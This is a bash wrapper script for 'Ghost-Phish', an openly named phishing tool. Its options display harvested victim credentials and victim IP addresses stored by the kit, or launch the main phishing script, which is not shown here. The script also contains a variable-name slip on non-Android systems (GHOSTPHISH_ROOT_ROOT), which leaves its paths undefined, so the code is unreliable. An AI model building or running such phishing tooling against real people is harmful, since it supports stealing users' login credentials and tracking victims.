#!/bin/bash

# https://github.com/aenoshrajora/Ghost-Phish

if [[ $(uname -o) == *'Android'* ]];then
	GHOSTPHISH_ROOT="/data/data/com.termux/files/usr/opt/ghost-phish"
else
	export GHOSTPHISH_ROOT_ROOT="/opt/ghost-phish"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Ghost-Phish type \`ghost-phish\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $GHOSTPHISH_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $GHOSTPHISH_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $GHOSTPHISH_ROOT
	bash ./ghost-phish.sh
fi
